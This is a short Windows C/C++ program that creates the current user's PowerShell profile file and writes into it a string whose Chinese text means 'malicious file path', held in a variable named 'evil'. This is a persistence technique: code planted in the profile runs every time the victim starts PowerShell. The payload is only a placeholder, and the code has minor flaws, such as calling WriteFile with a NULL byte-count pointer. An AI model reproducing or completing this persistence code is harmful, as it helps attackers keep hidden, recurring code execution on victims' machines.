#include <windows.h>
#include <stdio.h>
#include <strsafe.h>
#include <iostream>

int main(int argc, char* argv[]) {
  char path[MAX_PATH];
  char *homepath = getenv("USERPROFILE");
  char pspath[] = "\\Documents\\WindowsPowerShell";
  char psprofile[] = "\\Microsoft.PowerShell_profile.ps1";
  char evil[] = "恶意文件路径 ";
  DWORD evilLen = (DWORD)strlen(evil);

  StringCchCopy(path, MAX_PATH, homepath);
  StringCchCat(path, MAX_PATH, pspath);
  BOOL wd = CreateDirectoryA(path, NULL);
  if (wd == FALSE) {
    printf("Error: %s\n", path);
  } else {
    printf("Success: %s\n", path);
  }

  StringCchCat(path, MAX_PATH, psprofile);
  HANDLE hf = CreateFile(
    path,
    GENERIC_WRITE,
    0,
    NULL,
    CREATE_NEW,
    FILE_ATTRIBUTE_NORMAL,
    NULL
  );

  if (hf == INVALID_HANDLE_VALUE) {
    printf("Error: %s\n", path);
  } else {
    printf("Success: %s\n", path);
  }

  BOOL wf = WriteFile(hf, evil, evilLen, NULL, NULL);
  if (wf == FALSE) {
    printf("Error: %s\n", path);
  } else {
    printf("Success: %s\n", evil);
  }

  CloseHandle(hf);
  return 0;
}
